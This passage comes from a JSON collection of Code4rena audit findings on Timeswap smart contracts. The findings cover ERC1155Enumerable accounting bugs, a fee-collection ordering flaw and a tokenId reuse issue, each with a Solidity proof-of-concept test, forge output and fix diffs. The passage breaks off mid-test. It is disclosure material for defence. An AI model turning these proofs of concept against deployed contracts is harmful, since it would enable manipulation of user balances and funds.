\"\");\n    }\n\n    function burn(address from, uint256 id, uint256 amount) external {\n        _burn(from, id, amount);\n    }\n}\n\ncontract AuditTest is Test {\n    function test_ERC1155Enumerable_BadRemoveFromEnumeration() public {\n        TestERC1155Enumerable token = new TestERC1155Enumerable();\n        address alice = makeAddr(\"alice\");\n        uint256 tokenId = 0;\n        uint256 amount = 1;\n\n        token.mint(alice, tokenId, amount);\n\n        // tokenByIndex and totalSupply are ok\n        assertEq(token.tokenByIndex(0), tokenId);\n        assertEq(token.totalSupply(), 1);\n\n        // now we burn the token\n        token.burn(alice, tokenId, amount);\n\n        // tokenByIndex and totalSupply still report previous values\n        // tokenByIndex should throw index out of bounds, and supply should return 0\n        assertEq(token.tokenByIndex(0), tokenId);\n        assertEq(token.totalSupply(), 1);\n\n        // Now we mint it again, this will re-add the token to the enumeration, duplicating it\n        token.mint(alice, tokenId, amount);\n        assertEq(token.totalSupply(), 2);\n        assertEq(token.tokenByIndex(0), tokenId);\n        assertEq(token.tokenByIndex(1), tokenId);\n    }\n}\n```\n\n### Recommendation\n\nDecrease the amount before checking if the supply is 0.\n\n```solidity\nfunction _removeTokenEnumeration(address from, address to, uint256 id, uint256 amount) internal {\n    if (to == address(0)) {\n        _idTotalSupply[id] -= amount;\n        if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n    }\n\n    if (from != address(0) && from != to) {\n        if (balanceOf(from, id) == 0 && _additionalConditionRemoveTokenFromOwnerEnumeration(from, id)) _removeTokenFromOwnerEnumeration(from, id);\n    }\n}\n```\n**[vhawk19 (Timeswap) confirmed and resolved](https://github.com/code-423n4/2023-01-timeswap-findings/issues/248#issuecomment-1434505035):**\n > Resolved in [PR](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/commit/dd7d3c247235f0750516151c44873bbf23377212).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem in the `ERC1155Enumerable` base contract used in the `TimeswapV2Token` and `TimeswapV2LiquidityToken` tokens. The `_removeTokenEnumeration` condition to check if the supply is 0 happens before the function decreases the burned amount. This will prevent `_removeTokenFromAllTokensEnumeration` from being called when the last token(s) is(are) burned, causing the enumeration to always contain a minted token even though it is burned afterwards. This will also cause the enumeration to contain duplicate values or multiple copies of the same token.\n\nThe impact of this bug is that the function `totalSupply` and `tokenByIndex` will report wrong values. As a proof of concept, the following test demonstrates the issue. Alice is minted a token and that token is then burned, the token is still present in the enumeration. The token is minted again, causing the enumeration to contain the token by duplicate.\n\nThe recommended solution is to decrease the amount before checking if the supply is 0. This bug has been resolved in [PR](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/commit/dd7d3c247235f0750516151c44873bbf23377212).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/248",
      "tags": [],
      "finders": [
        "eierina",
        "hansfriese",
        "chaduke",
        "adriro",
        "mookimgo"
      ]
    },
    {
      "id": "24904",
      "title": "[M-01] `_currentIndex` is incorrectly updated; breaking the ERC1155 enumerable implementation",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-timeswap/blob/3be51465583552cce76816a05170fda7da68596a/packages/v2-token/src/base/ERC1155Enumerable.sol#L92-L101> \n\n<https://github.com/code-423n4/2023-01-timeswap/blob/3be51465583552cce76816a05170fda7da68596a/packages/v2-token/src/base/ERC1155Enumerable.sol#L116-L121> \n\n<https://github.com/code-423n4/2023-01-timeswap/blob/3be51465583552cce76816a05170fda7da68596a/packages/v2-token/src/base/ERC1155Enumerable.sol#L136-L149>\n\n### Impact\n\nWhen minting and burning tokens,the ERC1155Enumerable implementation does not correctly update the following states:\n\n*   uint256\\[] private \\_allTokens;\n*   mapping(uint256 => uint256) private \\_allTokensIndex;\n*   mapping(address => uint256) internal \\_currentIndex;\n\nIn particular:\n\n*   the \\_allTokens array length (and therefore the totalSupply()) always increases (never decreases)\n*   the \\_allTokensIndex\\[id] always increases\n*   the \\_curentIndex\\[from] always increases\n\n### Proof of Concept\n\nNOTE: the following test requires some private states of ERC1155Enumerable.sol to be set from private to internal.\n\n```solidity\ncontract HelperERC1155 is ERC1155Enumerable, ERC1155Holder {\n\n    constructor() ERC1155(\"Test\") {\n    }\n\n    function mint(uint256 id, uint256 amount) external {\n        _mint(msg.sender, id, amount, bytes(\"\"));\n    }\n\n    function burn(uint256 id, uint256 amount) external {\n        _burn(msg.sender, id, amount);\n    }\n\n    function currentIndex(address owner) external view returns (uint256) {\n        return _currentIndex[owner];\n    }\n\n    function allTokensIndex(uint256 id) external view returns (uint256) {\n        return _allTokensIndex[id];\n    }\n\n    function allTokens(uint256 idx) external view returns (uint256) {\n        return _allTokens[idx];\n    }\n\n    function idTotalSupply(uint256 id) external view returns (uint256) {\n        return _idTotalSupply[id];\n    }\n}\n\ncontract BugTest is Test, ERC1155Holder {\n\n    function testImplError() public {\n        HelperERC1155 token = new HelperERC1155();\n\n        for(uint i=0; i<10; i++){\n            token.mint(i, 1+i);\n        }\n\n        for(uint i=0; i<10; i++){\n            token.burn(i, 1+i);\n            assertEq(token.idTotalSupply(i), 0); // OK\n            assertEq(token.allTokensIndex(i), i); // NOT OK (should be 0)\n        }\n        \n        assertEq(token.totalSupply(), 10); // NOT OK (should be 0)\n        assertEq(token.currentIndex(address(this)), 10); // NOT OK (should be 0)\n    }\n\n    function testImplFixed() public {\n        HelperERC1155 token = new HelperERC1155();\n\n        for(uint i=0; i<10; i++){\n            token.mint(i, 1+i);\n        }\n\n        for(uint i=0; i<10; i++){\n            token.burn(i, 1+i);\n            assertEq(token.idTotalSupply(i), 0); // OK\n            assertEq(token.allTokensIndex(i), 0); // OK\n        }\n        \n        assertEq(token.totalSupply(), 0); // OK\n        assertEq(token.currentIndex(address(this)), 0); // OK\n    }\n}\n```\n\nBefore fix `forge test --match-contract BugTest -vvv` outputs:\n\n    Running 2 tests for test/Audit2.t.sol:BugTest\n    [PASS] testImplError() (gas: 2490610)\n    [FAIL. Reason: Assertion failed.] testImplFixed() (gas: 2560628)\n    Test result: FAILED. 1 passed; 1 failed; finished in 2.05ms\n\nAfter fix `forge test --match-contract BugTest -vvv` outputs:\n\n    Running 2 tests for test/Audit2.t.sol:BugTest\n    [FAIL. Reason: Assertion failed.] testImplError() (gas: 2558695)\n    [PASS] testImplFixed() (gas: 2489080)\n    Test result: FAILED. 1 passed; 1 failed; finished in 2.22ms\n\n### Recommended Mitigation Steps\n\nCorrect the implementation to update states correctly. Patch provided below for reference.\n\n```solidity\ndiff --git a/packages/v2-token/src/base/ERC1155Enumerable.sol b/packages/v2-token/src/base/ERC1155Enumerable.sol\nindex 4ec23ff..ef67bca 100644\n--- a/packages/v2-token/src/base/ERC1155Enumerable.sol\n+++ b/packages/v2-token/src/base/ERC1155Enumerable.sol\n@@ -91,8 +91,8 @@ abstract contract ERC1155Enumerable is IERC1155Enumerable, ERC1155 {\n     /// @dev Remove token enumeration list if necessary.\n     function _removeTokenEnumeration(address from, address to, uint256 id, uint256 amount) internal {\n         if (to == address(0)) {\n-            if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n             _idTotalSupply[id] -= amount;\n+            if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n         }\n\n         if (from != address(0) && from != to) {\n@@ -114,8 +114,7 @@ abstract contract ERC1155Enumerable is IERC1155Enumerable, ERC1155 {\n     /// @param to address representing the new owner of the given token ID\n     /// @param tokenId uint256 ID of the token to be added to the tokens list of the given address\n     function _addTokenToOwnerEnumeration(address to, uint256 tokenId) private {\n-        _currentIndex[to] += 1;\n-        uint256 length = _currentIndex[to];\n+        uint256 length = _currentIndex[to]++;\n         _ownedTokens[to][length] = tokenId;\n         _ownedTokensIndex[tokenId] = length;\n     }\n@@ -134,7 +133,7 @@ abstract contract ERC1155Enumerable is IERC1155Enumerable, ERC1155 {\n     /// @param from address representing the previous owner of the given token ID\n     /// @param tokenId uint256 ID of the token to be removed from the tokens list of the given address\n     function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private {\n-        uint256 lastTokenIndex = _currentIndex[from] - 1;\n+        uint256 lastTokenIndex = --_currentIndex[from];\n         uint256 tokenIndex = _ownedTokensIndex[tokenId];\n\n         if (tokenIndex != lastTokenIndex) {\n```\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-timeswap-findings/issues/272#issuecomment-1427142843):**\n > There are 2 bugs highlighted here:\n> \n>  - the check is incorrectly made before the state update in `_removeTokenEnumeration`\n>  - the order in which `_currentIndex` is updated\n>\n > So splitting this finding in 2. *(Note: issue title has been updated accordingly. Also, see newly created issue [`#300`](https://github.com/code-423n4/2023-01-timeswap-findings/issues/300).)*\n\n**[vhawk19 (Timeswap) confirmed and commented](https://github.com/code-423n4/2023-01-timeswap-findings/issues/272#issuecomment-1434502259):**\n > Updated the [ERC1155Enumerable.sol](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/blob/devel/packages/v2-token/contracts/base/ERC1155Enumerable.sol) implementation, which should resolve these issues. \n\n\n\n***\n\n",
      "summary": "\nThis bug report details an issue with the ERC1155Enumerable.sol implementation. When minting and burning tokens, the ERC1155Enumerable implementation does not correctly update the following states: uint256\\[] private \\_allTokens; mapping(uint256 => uint256) private \\_allTokensIndex; mapping(address => uint256) internal \\_currentIndex. In particular, the \\_allTokens array length (and therefore the totalSupply()) always increases (never decreases), the \\_allTokensIndex\\[id] always increases, and the \\_curentIndex\\[from] always increases. \n\nProof of concept tests were conducted to demonstrate the issue. Before the fix, the testImplError() test passed and the testImplFixed() test failed. After the fix, the testImplError() test failed and the testImplFixed() test passed. \n\nThe recommended mitigation step is to correct the implementation to update states correctly. A patch is provided for reference. Timeswap confirmed that they have updated the ERC1155Enumerable.sol implementation, which should resolve these issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/272",
      "tags": [],
      "finders": [
        "adriro",
        "eierina"
      ]
    },
    {
      "id": "24903",
      "title": "[H-03] The `collect()` function will always TRANSFER ZERO fees, losing _feesPositions without receiving fees!",
      "impact": "HIGH",
      "content": "\nDetailed description of the impact of this finding.\nThe `collect()` function will always transfer ZERO fees. At the same time, non-zero `_feesPosition` will be burned.\n\n    _feesPositions[id][msg.sender].burn(long0Fees, long1Fees, shortFees);\n\nAs a result, the contracts will be left in an inconsistent state. The user will burn `_feesPositions` without receiving the fees!\n\n### Proof of Concept\n\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\n\nThe `collect()` function will always transfer ZERO fees   in the following line:\n\n```\n // transfer the fees amount to the recipient\n        ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);\n\n```\n\nThis is because, at this moment, the values of  `long0Fees`, `long1Fees`, `shortFees` have not been calculated yet, actually, they will be equal to zero. Therefore, no fees will be transferred. The values of  `long0Fees`, `long1Fees`, `shortFees` are calculated afterwards by the following line:\n\n```\n(long0Fees, long1Fees, shortFees) = _feesPositions[id][msg.sender].getFees(param.long0FeesDesired, param.long1FeesDesired, param.shortFeesDesired);\n\n```\n\nTherefore, `ITimeswapV2Pool(poolPair).transferFees` must be called after this line to be correct.\n\n### Tools Used\n\nRemix\n\n### Recommended Mitigation Steps\n\nWe moved the line  `ITimeswapV2Pool(poolPair).transferFees` after `long0Fees`, `long1Fees`, `shortFees` have been calculated first.\n\n    function collect(TimeswapV2LiquidityTokenCollectParam calldata param) external returns (uint256 long0Fees, uint256 long1Fees, uint256 shortFees, bytes memory data) {\n            ParamLibrary.check(param);\n\n            bytes32 key = TimeswapV2LiquidityTokenPosition({token0: param.token0, token1: param.token1, strike: param.strike, maturity: param.maturity}).toKey();\n\n            // start the reentrancy guard\n            raiseGuard(key);\n\n            (, address poolPair) = PoolFactoryLibrary.getWithCheck(optionFactory, poolFactory, param.token0, param.token1);\n\n\n            uint256 id = _timeswapV2LiquidityTokenPositionIds[key];\n\n            _updateFeesPositions(msg.sender, address(0), id);\n\n            (long0Fees, long1Fees, shortFees) = _feesPositions[id][msg.sender].getFees(param.long0FeesDesired, param.long1FeesDesired, param.shortFeesDesired);\n\n            if (param.data.length != 0)\n                data = ITimeswapV2LiquidityTokenCollectCallback(msg.sender).timeswapV2LiquidityTokenCollectCallback(\n                    TimeswapV2LiquidityTokenCollectCallbackParam({\n                        token0: param.token0,\n                        token1: param.token1,\n                        strike: param.strike,\n                        maturity: param.maturity,\n                        long0Fees: long0Fees,\n                        long1Fees: long1Fees,\n                        shortFees: shortFees,\n                        data: param.data\n                    })\n                );\n\n                    // transfer the fees amount to the recipient\n            ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);\n\n\n            // burn the desired fees from the fees position\n            _feesPositions[id][msg.sender].burn(long0Fees, long1Fees, shortFees);\n\n            if (long0Fees != 0 || long1Fees != 0 || shortFees != 0) _removeTokenEnumeration(msg.sender, address(0), id, 0);\n\n            // stop the reentrancy guard\n            lowerGuard(key);\n        }\n\n**[vhawk19 (Timeswap) confirmed and resolved](https://github.com/code-423n4/2023-01-timeswap-findings/issues/121#issuecomment-1422586075):**\n > Fixed in [PR](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/256).\n\n\n***\n\n \n",
      "summary": "\nA bug was found in the `collect()` function of the TimeswapV2LiquidityToken contract. The function will always transfer zero fees, and non-zero `_feesPositions` will be burned. This leaves the contracts in an inconsistent state, as the user will burn `_feesPositions` without receiving the fees.\n\nThe bug was found in the following line:\n\n    // transfer the fees amount to the recipient\n    ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);\n\nThe values of  `long0Fees`, `long1Fees`, `shortFees` have not been calculated yet, and will be equal to zero. Therefore, no fees will be transferred. \n\nThe bug was fixed by moving the line  `ITimeswapV2Pool(poolPair).transferFees` after `long0Fees`, `long1Fees`, `shortFees` have been calculated first. This was done with the help of Remix tool, and the fix was confirmed and resolved by vhawk19 (Timeswap).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/121",
      "tags": [],
      "finders": [
        "0xcm",
        "Beepidibop",
        "chaduke"
      ]
    },
    {
      "id": "24902",
      "title": "[H-02] TimeswapV2LiquidityToken should not use `totalSupply()+1` as tokenId",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L114> \n\n<https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L103>\n\n### Impact\n\nAssuming ERC1155Enumerable is acting normally, there is an **Accounting Issue** about TimeswapV2LiquidityToken and TimeswapV2Token's tokenId.\n\nDifferent liquidities can have the same `tokenId`, leading to serious balance manipulation.\n\nI'm submitting this issue as medium because current implementation ERC1155Enumerable is wrong, which exactly mitigates this issue making it not exploitable. But this issue will become dangerous once we fixed ERC1155Enumerable.\n\n### Proof of Concept\n\nIn this PoC, the attacker will do these steps:\n\n1.  Add liquidity of token0 and token1, thus receiving TimeswapV2LiquidityToken tokenId 1.\n2.  Add liquidity of token2 and token3, thus receiving TimeswapV2LiquidityToken tokenId 2.\n3.  Burn his liquidity from step1, which will make totalSupply decrease (if ERC1155Enumerable has been patched).\n4.  Add liquidity of token4 and token5, and receive TimeswapV2LiquidityToken tokenId 2. This is wrong tokenId, which should be 3.\n\nExplanation:\n\n<https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L112>\n\nAs the comment said, `if the position does not exist, create it`, but the new tokenId is set as `totalSupply() + 1`.\n\nFunction totalSupply is defined in `packages/v2-token/src/base/ERC1155Enumerable.sol`, which is simply `\\_allTokens.length`: <https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/base/ERC1155Enumerable.sol#L37-L38>\n\n`\\_allTokens.length` can be decreased in `_removeTokenFromAllTokensEnumeration` function, which is called by `_removeTokenEnumeration`, and by `_afterTokenTransfer`. In simple words, when all token amounts for a specific tokenId are burned (`_idTotalSupply[id] == 0`), totalSupply should be decreased.\n\nCurrent implementation of ERC1155Enumerable has a bug, which will never trigger `_removeTokenFromAllTokensEnumeration`: Calling `\\_removeTokenEnumeration needs amount>0`, but only `_idTotalSupply[id] == 0` can trigger `\\_removeTokenFromAllTokensEnumeration`.\n\n        function _removeTokenEnumeration(address from, address to, uint256 id, uint256 amount) internal {\n            if (to == address(0)) {\n                if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n                _idTotalSupply[id] -= amount;\n            }\n\nOnce the above code gets fixed (swapping the if line and `_idTotalSupply[id] -= amount;` line, patch given below), this issue becomes exploitable, making the accounting of LP wrong.\n\n***\n\nProof of Concept steps:\n\nFirst, we need to patch two contracts:\n\n*   making TimeswapV2LiquidityToken's `\\_timeswapV2LiquidityTokenPositionIds` as public for testing, this can be removed when depolying\n*   ERC1155Enumerable's `\\_removeTokenEnumeration` has been patched to behave correctly, which will decrease `totalSupply` when all token amount of a specific tokenId has been burned.\n\n<!---->\n\n    diff --git a/packages/v2-token/src/TimeswapV2LiquidityToken.sol b/packages/v2-token/src/TimeswapV2LiquidityToken.sol\n    index 2f71a25..f3910d9 100644\n    --- a/packages/v2-token/src/TimeswapV2LiquidityToken.sol\n    +++ b/packages/v2-token/src/TimeswapV2LiquidityToken.sol\n    @@ -42,7 +42,7 @@ contract TimeswapV2LiquidityToken is ITimeswapV2LiquidityToken, ERC1155Enumerabl\n     \n         mapping(uint256 => TimeswapV2LiquidityTokenPosition) private _timeswapV2LiquidityTokenPositions;\n     \n    -    mapping(bytes32 => uint256) private _timeswapV2LiquidityTokenPositionIds;\n    +    mapping(bytes32 => uint256) public _timeswapV2LiquidityTokenPositionIds;\n     \n         mapping(uint256 => mapping(address => FeesPosition)) private _feesPositions;\n     \n    diff --git a/packages/v2-token/src/base/ERC1155Enumerable.sol b/packages/v2-token/src/base/ERC1155Enumerable.sol\n    index 4ec23ff..4f51fb4 100644\n    --- a/packages/v2-token/src/base/ERC1155Enumerable.sol\n    +++ b/packages/v2-token/src/base/ERC1155Enumerable.sol\n    @@ -91,8 +91,8 @@ abstract contract ERC1155Enumerable is IERC1155Enumerable, ERC1155 {\n         /// @dev Remove token enumeration list if necessary.\n         function _removeTokenEnumeration(address from, address to, uint256 id, uint256 amount) internal {\n             if (to == address(0)) {\n    -            if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n                 _idTotalSupply[id] -= amount;\n    +            if (_idTotalSupply[id] == 0 && _additionalConditionRemoveTokenFromAllTokensEnumeration(id)) _removeTokenFromAllTokensEnumeration(id);\n             }\n     \n             if (from != address(0) && from != to) {\n\nAdd a new test file in `2023-01-timeswap/packages/v2-token/test/TimeswapV2LiquidityToken_MultiMint.t.sol`:\n\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity =0.8.8;\n\nimport \"forge-std/Test.sol\";\n\nimport \"forge-std/console.sol\";\n\nimport \"../src/TimeswapV2LiquidityToken.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@timeswap-labs/v2-option/src/TimeswapV2OptionFactory.sol\";\nimport \"@timeswap-labs/v2-option/src/interfaces/ITimeswapV2Option.sol\";\nimport {TimeswapV2LiquidityTokenCollectParam} from \"../src/structs/Param.sol\";\nimport \"@timeswap-labs/v2-pool/src/TimeswapV2PoolFactory.sol\";\nimport \"@timeswap-labs/v2-pool/src/interfaces/ITimeswapV2Pool.sol\";\nimport {TimeswapV2PoolMintParam} from \"@timeswap-labs/v2-pool/src/structs/Param.sol\";\nimport {TimeswapV2PoolMintChoiceCallbackParam, TimeswapV2PoolMintCallbackParam} from \"@timeswap-labs/v2-pool/src/structs/CallbackParam.sol\";\n\nimport {TimeswapV2OptionMintCallbackParam, TimeswapV2OptionSwapCallbackParam} from \"@timeswap-labs/v2-option/src/structs/CallbackParam.sol\";\n\n// import \"@timeswap-labs/v2-option/src/TimeswapV2OptionFactory.sol\";\n// // import \"@timeswap-labs/v2-option/src/interfaces/ITimeswapV2Option.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol\";\nimport {TimeswapV2LiquidityTokenPosition, PositionLibrary} from \"../src/structs/Position.sol\";\nimport {TimeswapV2PoolMint} from \"@timeswap-labs/v2-pool/src/enums/Transaction.sol\";\nimport {TimeswapV2OptionMint} from \"@timeswap-labs/v2-option/src/enums/Transaction.sol\";\n\nimport {StrikeConversion} from \"@timeswap-labs/v2-library/src/StrikeConversion.sol\";\nimport {DurationCalculation} from \"@timeswap-labs/v2-pool/src/libraries/DurationCalculation.sol\";\nimport {FullMath} from \"@timeswap-labs/v2-library/src/FullMath.sol\";\n\ncontract HelperERC20 is ERC20 {\n    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {\n        _mint(msg.sender, type(uint256).max);\n    }\n}\nstruct Timestamps {\n    uint256 maturity;\n    uint256 timeNow;\n}\nstruct MintOutput {\n    uint160 liquidityAmount;\n    uint256 long0Amount;\n    uint256 long1Amount;\n    uint256 shortAmount;\n    bytes data;\n}\n\ncontract TimeswapV2LiquidityTokenTest is Test, ERC1155Holder {\n    ITimeswapV2Option opPair;\n    ITimeswapV2Option opPair2;\n    ITimeswapV2Option opPair3;\n    ITimeswapV2Option opPairCurrent;\n    TimeswapV2OptionFactory optionFactory;\n    TimeswapV2PoolFactory poolFactory;\n    ITimeswapV2Pool pool;\n    ITimeswapV2Pool pool2;\n    ITimeswapV2Pool pool3;\n    ITimeswapV2Pool poolCurrent;\n    using PositionLibrary for TimeswapV2LiquidityTokenPosition;\n\n    uint256 chosenTransactionFee = 5;\n    uint256 chosenProtocolFee = 4;\n\n    HelperERC20 token0;\n    HelperERC20 token1;\n    HelperERC20 token2;\n    HelperERC20 token3;\n    HelperERC20 token4;\n    HelperERC20 token5;\n    HelperERC20 token0Current;\n    HelperERC20 token1Current;\n    TimeswapV2LiquidityToken mockLiquidityToken;\n\n    function timeswapV2PoolMintChoiceCallback(TimeswapV2PoolMintChoiceCallbackParam calldata param) external returns (uint256 long0Amount, uint256 long1Amount, bytes memory data) {\n        vm.assume(param.longAmount < (1 << 127));\n        long0Amount = StrikeConversion.turn(param.longAmount / 2, param.strike, false, true) + 1;\n        long1Amount = StrikeConversion.turn(param.longAmount / 2, param.strike, true, true) + 1;\n        vm.assume(\n            param.longAmount < StrikeConversion.combine(long0Amount, long1Amount, param.strike, false) && param.shortAmount < StrikeConversion.combine(long0Amount, long1Amount, param.strike, false)\n        );\n    }\n\n    function timeswapV2PoolMintCallback(TimeswapV2PoolMintCallbackParam calldata param) external returns (bytes memory data) {\n        // have to transfer param.long0Amount, param.long1Amount and param.short to msg.sender\n        console.log(param.long0Amount, param.long1Amount);\n        TimeswapV2OptionMintParam memory mparam = TimeswapV2OptionMintParam({\n            strike: param.strike,\n            maturity: param.maturity,\n            long0To: msg.sender,\n            long1To: msg.sender,\n            shortTo: msg.sender,\n            transaction: TimeswapV2OptionMint.GivenTokensAndLongs,\n            amount0: param.long0Amount,\n            amount1: param.long1Amount,\n            data: \"\"\n        });\n        opPairCurrent.mint(mparam);\n        console.log(\"opPair mint ok\");\n    }\n\n    function timeswapV2OptionMintCallback(TimeswapV2OptionMintCallbackParam calldata param) external returns (bytes memory data) {\n        data = param.data;\n        //console.log(\"token0 bal:\", token0.balanceOf(address(this)));\n        //console.log(\"token1 bal:\", token1.balanceOf(address(this)));\n        token0Current.transfer(msg.sender, param.token0AndLong0Amount);\n        token1Current.transfer(msg.sender, param.token1AndLong1Amount);\n    }\n\n    function timeswapV2LiquidityTokenMintCallback(TimeswapV2LiquidityTokenMintCallbackParam calldata param) external returns (bytes memory data) {\n        TimeswapV2PoolMintParam memory param1 = TimeswapV2PoolMintParam({\n            strike: param.strike, \n            maturity: param.maturity, \n            to: address(this), \n            transaction: TimeswapV2PoolMint.GivenLiquidity, \n            delta: param.liquidityAmount, \n            data: \"\"}\n        );\n\n        poolCurrent.mint(param1);\n        poolCurrent.transferLiquidity(param.strike, param.maturity, msg.sender, param.liquidityAmount);\n        data = bytes(\"\");\n    }\n\n    function setUp() public {\n        optionFactory = new TimeswapV2OptionFactory();\n        token0 = new HelperERC20(\"Token A\", \"A\");\n        token1 = new HelperERC20(\"Token B\", \"B\");\n        token2 = new HelperERC20(\"Token C\", \"C\");\n        token3 = new HelperERC20(\"Token D\", \"D\");\n        token4 = new HelperERC20(\"Token E\", \"E\");\n        token5 = new HelperERC20(\"Token F\", \"F\");\n        if (address(token1) < address(token0)) {\n            (token0, token1) = (token1, token0);\n        }\n        if (address(token3) < address(token2)) {\n            (token2, token3) = (token3, token2);\n        }\n        if (address(token5) < address(token4)) {\n            (token4, token5) = (token5, token4);\n        }\n        address opAddress = optionFactory.create(address(token0), address(token1));\n        opPair = ITimeswapV2Option(opAddress);\n        address opAddress2 = optionFactory.create(address(token2), address(token3));\n        opPair2 = ITimeswapV2Option(opAddress2);\n        address opAddress3 = optionFactory.create(address(token4), address(token5));\n        opPair3 = ITimeswapV2Option(opAddress3);\n        poolFactory = new TimeswapV2PoolFactory(address(this), chosenTransactionFee, chosenProtocolFee);\n        pool = ITimeswapV2Pool(poolFactory.create(opAddress));\n        pool2 = ITimeswapV2Pool(poolFactory.create(opAddress2));\n        pool3 = ITimeswapV2Pool(poolFactory.create(opAddress3));\n        mockLiquidityToken = new TimeswapV2LiquidityToken(address(optionFactory), address(poolFactory));\n    }\n\n    function testMint(uint256 strike, uint160 amt, uint256 maturity, uint160 rate, address to) public {\n        setUp();\n\n        // vm.assume(strike != 0 && (maturity < type(uint96).max) && (maturity > 10000) && amt > 100 && delta != 0 && rate != 0);\n        vm.assume(to != address(0));\n        vm.assume(\n            maturity < type(uint96).max &&\n                amt < type(uint160).max &&\n                amt != 0 &&\n                to != address(0) &&\n                strike != 0 &&\n                maturity > block.timestamp &&\n                maturity > 10000 && rate>0\n        );\n\n        console.log(\"init\");\n        pool.initialize(strike, maturity, rate);\n        pool2.initialize(strike, maturity, rate);\n        pool3.initialize(strike, maturity, rate);\n\n        //TimeswapV2PoolMintParam memory param = TimeswapV2PoolMintParam({strike: strike, maturity: maturity, to: address(this), transaction: TimeswapV2PoolMint.GivenLiquidity, delta: amt, data: \"\"});\n\n        //MintOutput memory response;\n        //(response.liquidityAmount, response.long0Amount, response.long1Amount, response.shortAmount, response.data) = pool.mint(param);\n        uint256 id1;\n        uint256 id2;\n        {\n            token0Current = token0;\n            token1Current = token1;\n            poolCurrent = pool;\n            opPairCurrent = opPair;\n            TimeswapV2LiquidityTokenMintParam memory liqTokenMintParam = TimeswapV2LiquidityTokenMintParam({\n                token0: address(token0Current),\n                token1: address(token1Current),\n                strike: strike,\n                maturity: maturity,\n                to: address(this),\n                liquidityAmount: amt,\n                data: \"\"\n            });\n\n            mockLiquidityToken.mint(liqTokenMintParam);\n            //console.log(mockLiquidityToken.balanceOf(address(this)));\n            TimeswapV2LiquidityTokenPosition memory timeswapV2LiquidityTokenPosition = TimeswapV2LiquidityTokenPosition({\n                token0: address(token0Current),\n                token1: address(token1Current),\n                strike: strike,\n                maturity: maturity\n            });\n\n            bytes32 key1 = timeswapV2LiquidityTokenPosition.toKey();\n            id1 = mockLiquidityToken._timeswapV2LiquidityTokenPositionIds(key1);\n            console.log(\"key1:\");\n            console.logBytes32(key1);\n            console.log(\"id1:\", id1);\n            assertEq(mockLiquidityToken.balanceOf(address(this), id1), amt);\n            assertEq(mockLiquidityToken.totalSupply(), 1);\n            //console.log(\"_idTotalSupply id1:\", mockLiquidityToken._idTotalSupply(id1));\n            console.log(\"========\");\n        }\n\n\n        {\n            token0Current = token2;\n            token1Current = token3;\n            poolCurrent = pool2;\n            opPairCurrent = opPair2;\n            TimeswapV2LiquidityTokenMintParam memory liqTokenMintParam2 = TimeswapV2LiquidityTokenMintParam({\n                token0: address(token0Current),\n                token1: address(token1Current),\n                strike: strike,\n                maturity: maturity,\n                to: address(this),\n                liquidityAmount: amt,\n                data: \"\"\n            });\n\n            mockLiquidityToken.mint(liqTokenMintParam2);\n            //console.log(mockLiquidityToken.balanceOf(address(this)));\n            TimeswapV2LiquidityTokenPosition memory timeswapV2LiquidityTokenPosition2 = TimeswapV2LiquidityTokenPosition({\n                token0: address(token0Current),\n                token1: address(token1Current),\n                strike: strike,\n                maturity: maturity\n            });\n\n            bytes32 key2 = timeswapV2LiquidityTokenPosition2.toKey();\n            id2 = mockLiquidityToken._timeswapV2LiquidityTokenPositionIds(key2);\n            console.log(\"key2:\");\n            console.logBytes32(key2);\n            console.log(\"id2:\", id2);\n            assertEq(mockLiquidityToken.balanceOf(address(this), id2), amt);\n            assertEq(mockLiquidityToken.totalSupply(), 2);\n            console.log(\"========\");\n        }\n\n        